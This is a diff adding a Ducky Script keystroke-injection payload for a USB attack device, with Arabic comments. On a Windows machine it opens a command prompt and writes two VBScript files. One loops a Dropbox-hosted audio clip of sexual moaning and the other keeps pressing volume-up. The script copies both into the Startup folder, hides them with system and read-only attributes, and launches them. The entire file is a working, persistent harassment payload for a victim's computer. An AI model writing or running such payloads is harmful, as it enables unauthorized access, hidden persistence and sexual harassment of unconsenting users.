@@ -1,0 +1,60 @@
+DELAY 200
+GUI r
+DELAY 200
+STRING cmd
+ENTER
+DELAY 500
+
+REM تأكد من تنفيذ الأمر بلا أسئلة باستخدام echo y
+STRING echo y | cd %tmp% && copy con rickyou.vbs
+ENTER
+STRING While true
+ENTER
+STRING Dim oPlayer
+ENTER
+STRING Set oPlayer = CreateObject("WMPlayer.OCX")
+ENTER
+STRING oPlayer.URL = "https://www.dropbox.com/scl/fi/nqiolofrry3tztri0q85z/59277957_sexy-girl-moaning_by_soundelements_preview.mp3?rlkey=47aeoegxe58toj5w8v6ccgw18&st=oio48ju0&dl=0"
+ENTER
+STRING oPlayer.controls.play
+ENTER
+STRING While oPlayer.playState <> 1
+ENTER
+STRING WScript.Sleep 100
+ENTER
+STRING Wend
+ENTER
+STRING oPlayer.close
+ENTER
+STRING Wend
+ENTER
+CTRL z
+ENTER
+
+REM استخدم echo y للتجاوز هنا أيضاً
+STRING echo y | copy con volup.vbs
+ENTER
+STRING do
+ENTER
+STRING Set WshShell = CreateObject("WScript.Shell")
+ENTER
+STRING WshShell.SendKeys(chr(&hAF))
+ENTER
+STRING WScript.Sleep 10
+ENTER
+STRING loop
+ENTER
+CTRL z
+ENTER
+
+REM استخدم /y مع copy لتجاوز الأسئلة
+STRING copy /y rickyou.vbs "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\"
+ENTER
+STRING copy /y volup.vbs "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\"
+ENTER
+STRING attrib +h +s +r "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\rickyou.vbs"
+ENTER
+STRING attrib +h +s +r "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\volup.vbs"
+ENTER
+STRING start rickyou.vbs && start volup.vbs
+ENTER
